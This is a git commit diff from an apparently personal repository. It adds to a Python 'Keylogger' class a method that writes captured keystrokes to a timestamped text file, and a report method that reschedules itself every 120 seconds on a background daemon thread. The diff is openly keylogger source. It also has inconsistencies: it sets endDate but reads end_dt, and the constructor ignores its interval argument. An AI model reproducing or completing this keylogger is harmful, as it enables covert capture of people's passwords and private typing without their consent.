5c767632288f02c9b9b0b41064cc88fd9bbd4fcc
clutzyninja <bmbusaf@yahoo.com>
2022-03-28 11:20:31 -0400

    init

--- take2.py
+++ take2.py
@@ -9,7 +9,7 @@ REPORT_INTERVAL = 120
 
 class Keylogger:
 
-    def init(self, interval):
+    def __init__(self, interval):
         self.interval = REPORT_INTERVAL
         self.log = ""
         self.startDate = datetime.now()
@@ -34,4 +34,25 @@ class Keylogger:
         endDateString = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
         self.filename = f"keylog--{startDateString} to {endDateString}"
 
+    def writeFile(self):
+        with open(f"{self.filename}.txt", "w") as f:
+            print(self.log, file=f)
+        print(f"[+] Saved {self.filename}.txt")
 
+    def report(self):
+        """Called every interval"""
+        if self.log:
+            # if there is something in log, report it
+            self.endDate = datetime.now()
+            # update `self.filename`
+            self.updateFilename()
+            self.writeFile()
+            # if you want to print in the console, uncomment below line
+            # print(f"[{self.filename}] - {self.log}")
+            self.startDate = datetime.now()
+        self.log = ""
+        timer = Timer(interval=self.interval, function=self.report)
+        # set the thread as daemon (dies when main thread die)
+        timer.daemon = True
+        # start the timer
+        timer.start()
